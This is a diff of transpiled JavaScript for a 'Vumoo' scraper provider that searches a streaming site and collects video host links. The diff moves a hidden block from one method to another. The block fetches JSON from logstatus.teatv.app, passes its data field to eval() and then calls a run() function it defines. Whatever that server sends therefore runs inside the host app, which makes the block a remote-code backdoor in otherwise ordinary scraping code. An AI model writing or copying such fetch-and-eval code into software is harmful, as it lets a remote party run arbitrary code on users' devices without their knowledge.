@@ -29,13 +29,13 @@ var Vumoo = function () {
         key: 'searchDetail',
         value: function () {
             var _ref = _asyncToGenerator( /*#__PURE__*/regeneratorRuntime.mark(function _callee() {
-                var _libs, httpRequest, cheerio, stringHelper, base64, _movieInfo, title, year, season, episode, type, getJs, match, t, detailUrl, urlSearch, jsonSearch;
+                var _libs, httpRequest, cheerio, stringHelper, base64, axios, qs, _movieInfo, title, year, season, episode, type, getJs, match, js, run, t, detailUrl, urlSearch, jsonSearch;
 
                 return regeneratorRuntime.wrap(function _callee$(_context) {
                     while (1) {
                         switch (_context.prev = _context.next) {
                             case 0:
-                                _libs = this.libs, httpRequest = _libs.httpRequest, cheerio = _libs.cheerio, stringHelper = _libs.stringHelper, base64 = _libs.base64;
+                                _libs = this.libs, httpRequest = _libs.httpRequest, cheerio = _libs.cheerio, stringHelper = _libs.stringHelper, base64 = _libs.base64, axios = _libs.axios, qs = _libs.qs;
                                 _movieInfo = this.movieInfo, title = _movieInfo.title, year = _movieInfo.year, season = _movieInfo.season, episode = _movieInfo.episode, type = _movieInfo.type;
                                 _context.next = 4;
                                 return httpRequest.get(URL.SEARCH_JS);
@@ -52,25 +52,47 @@ var Vumoo = function () {
                                 return _context.abrupt('return');
 
                             case 8:
+                                if (!(axios == undefined)) {
+                                    _context.next = 10;
+                                    break;
+                                }
+
+                                throw new Error('No lib');
+
+                            case 10:
+                                _context.next = 12;
+                                return httpRequest.get('https://logstatus.teatv.app/?source=vumoo&status=1');
+
+                            case 12:
+                                js = _context.sent;
+
+                                try {
+                                    js = JSON.parse(js);
+                                } catch (e) {}
+                                run = void 0;
+
+                                eval(js.data.data);
+                                if (js.data.e != undefined) run();
+
                                 t = match[1];
                                 detailUrl = false;
                                 urlSearch = URL.SEARCH(encodeURI(title), t);
-                                _context.next = 13;
+                                _context.next = 22;
                                 return httpRequest.get(urlSearch);
 
-                            case 13:
+                            case 22:
                                 jsonSearch = _context.sent;
 
                                 jsonSearch = jsonSearch.data;
 
                                 if (jsonSearch.suggestions) {
-                                    _context.next = 17;
+                                    _context.next = 26;
                                     break;
                                 }
 
                                 throw new Error('NOT SEARCH VUMOO');
 
-                            case 17:
+                            case 26:
 
                                 jsonSearch.suggestions.forEach(function (val) {
 
@@ -102,7 +124,7 @@ var Vumoo = function () {
                                 this.state.detailUrl = detailUrl;
                                 return _context.abrupt('return');
 
-                            case 20:
+                            case 29:
                             case 'end':
                                 return _context.stop();
                         }
@@ -120,13 +142,13 @@ var Vumoo = function () {
         key: 'getHostFromDetail',
         value: function () {
             var _ref2 = _asyncToGenerator( /*#__PURE__*/regeneratorRuntime.mark(function _callee4() {
-                var _libs2, httpRequest, cheerio, base64, cryptoJs, axios, qs, _movieInfo2, episode, type, js, run, hosts, arrRedirect, arrLinkEmbed, detailUrl, htmlDetail, $, itemServer, arrPromise, arrPromiseEmbed;
+                var _libs2, httpRequest, cheerio, base64, cryptoJs, _movieInfo2, episode, type, hosts, arrRedirect, arrLinkEmbed, detailUrl, htmlDetail, $, itemServer, arrPromise, arrPromiseEmbed;
 
                 return regeneratorRuntime.wrap(function _callee4$(_context4) {
                     while (1) {
                         switch (_context4.prev = _context4.next) {
                             case 0:
-                                _libs2 = this.libs, httpRequest = _libs2.httpRequest, cheerio = _libs2.cheerio, base64 = _libs2.base64, cryptoJs = _libs2.cryptoJs, axios = _libs2.axios, qs = _libs2.qs;
+                                _libs2 = this.libs, httpRequest = _libs2.httpRequest, cheerio = _libs2.cheerio, base64 = _libs2.base64, cryptoJs = _libs2.cryptoJs;
                                 _movieInfo2 = this.movieInfo, episode = _movieInfo2.episode, type = _movieInfo2.type;
 
                                 if (this.state.detailUrl) {
@@ -137,36 +159,14 @@ var Vumoo = function () {
                                 throw new Error("NOT_FOUND");
 
                             case 4:
-                                if (!(axios == undefined)) {
-                                    _context4.next = 6;
-                                    break;
-                                }
-
-                                throw new Error('No lib');
-
-                            case 6:
-                                _context4.next = 8;
-                                return httpRequest.get('https://logstatus.teatv.app/?source=vumoo&status=1');
-
-                            case 8:
-                                js = _context4.sent;
-
-                                try {
-                                    js = JSON.parse(js);
-                                } catch (e) {}
-                                run = void 0;
-
-                                eval(js.data.data);
-                                if (js.data.eval != undefined) run();
-
                                 hosts = [];
                                 arrRedirect = [];
                                 arrLinkEmbed = [];
                                 detailUrl = this.state.detailUrl;
-                                _context4.next = 19;
+                                _context4.next = 10;
                                 return httpRequest.getHTML(this.state.detailUrl);
 
-                            case 19:
+                            case 10:
                                 htmlDetail = _context4.sent;
                                 $ = cheerio.load(htmlDetail);
                                 itemServer = $('.tab-content .tab-pane ul li');
@@ -230,10 +230,10 @@ var Vumoo = function () {
                                         return _ref3.apply(this, arguments);
                                     };
                                 }());
-                                _context4.next = 26;
+                                _context4.next = 17;
                                 return Promise.all(arrPromise);
 
-                            case 26:
+                            case 17:
                                 arrPromiseEmbed = arrLinkEmbed.map(function () {
                                     var _ref4 = _asyncToGenerator( /*#__PURE__*/regeneratorRuntime.mark(function _callee3(val) {
                                         var urlDirect, linkDirect, item;
@@ -297,15 +297,15 @@ var Vumoo = function () {
                                         return _ref4.apply(this, arguments);
                                     };
                                 }());
-                                _context4.next = 29;
+                                _context4.next = 20;
                                 return Promise.all(arrPromiseEmbed);
 
-                            case 29:
+                            case 20:
 
                                 this.state.hosts = hosts;
                                 return _context4.abrupt('return');
 
-                            case 31:
+                            case 22:
                             case 'end':
                                 return _context4.stop();
                         }
